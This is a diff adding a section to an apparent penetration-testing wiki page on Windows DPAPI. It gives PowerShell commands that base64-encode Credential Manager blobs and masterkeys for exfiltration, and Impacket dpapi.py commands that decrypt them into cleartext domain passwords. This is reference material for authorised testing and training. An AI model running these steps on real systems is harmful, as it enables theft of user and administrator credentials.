@@ -263,6 +263,45 @@ SharpDPAPI.exe blob /target:C:\path\to\encrypted\file /unprotect
 ```
 
 ---
+### Offline decryption with Impacket dpapi.py
+
+If you have the victim user’s SID and password (or NT hash), you can decrypt DPAPI masterkeys and Credential Manager blobs entirely offline using Impacket’s dpapi.py.
+
+- Identify artefacts on disk:
+  - Credential Manager blob(s): %APPDATA%\Microsoft\Credentials\<hex>
+  - Matching masterkey: %APPDATA%\Microsoft\Protect\<SID>\{GUID}
+
+- If file transfer tooling is flaky, base64 the files on-host and copy the output:
+
+```powershell
+# Base64-encode files for copy/paste exfil
+[Convert]::ToBase64String([IO.File]::ReadAllBytes("$env:APPDATA\Microsoft\Credentials\C8D69E...B9"))
+[Convert]::ToBase64String([IO.File]::ReadAllBytes("$env:APPDATA\Microsoft\Protect\<SID>\556a2412-1275-4ccf-b721-e6a0b4f90407"))
+```
+
+- Decrypt the masterkey with the user’s SID and password/hash:
+
+```bash
+# Plaintext password
+python3 dpapi.py masterkey -file 556a2412-1275-4ccf-b721-e6a0b4f90407 \
+  -sid S-1-5-21-1111-2222-3333-1107 -password 'UserPassword!'
+
+# Or with NT hash
+python3 dpapi.py masterkey -file 556a2412-1275-4ccf-b721-e6a0b4f90407 \
+  -sid S-1-5-21-1111-2222-3333-1107 -key 0x<NTLM_HEX>
+```
+
+- Use the decrypted masterkey to decrypt the credential blob:
+
+```bash
+python3 dpapi.py credential -file C8D69EBE9A43E9DEBF6B5FBD48B521B9 -key 0x<MASTERKEY_HEX>
+# Expect output like: Type=CRED_TYPE_DOMAIN_PASSWORD; Target=Domain:target=DOMAIN
+# Username=<user> ; Password=<cleartext>
+```
+
+This workflow often recovers domain credentials saved by apps using the Windows Credential Manager, including administrative accounts (e.g., `*_adm`).
+
+---
 ### Handling Optional Entropy ("Third-party entropy")
 
 Some applications pass an additional **entropy** value to `CryptProtectData`. Without this value the blob cannot be decrypted, even if the correct masterkey is known. Obtaining the entropy is therefore essential when targeting credentials protected in this way (e.g. Microsoft Outlook, some VPN clients).
@@ -391,5 +430,7 @@ Decryption yields the complete JSON configuration, including every **device post
 - [https://github.com/Hashcat/Hashcat/releases/tag/v6.2.6](https://github.com/Hashcat/Hashcat/releases/tag/v6.2.6)
 - [https://github.com/Leftp/DPAPISnoop](https://github.com/Leftp/DPAPISnoop)
 - [https://pypi.org/project/donpapi/2.0.0/](https://pypi.org/project/donpapi/2.0.0/)
+- [Impacket – dpapi.py](https://github.com/fortra/impacket)
+- [HTB Puppy: AD ACL abuse, KeePassXC Argon2 cracking, and DPAPI decryption to DC admin](https://0xdf.gitlab.io/2025/09/27/htb-puppy.html)
 
 {{#include ../../banners/hacktricks-training.md}}
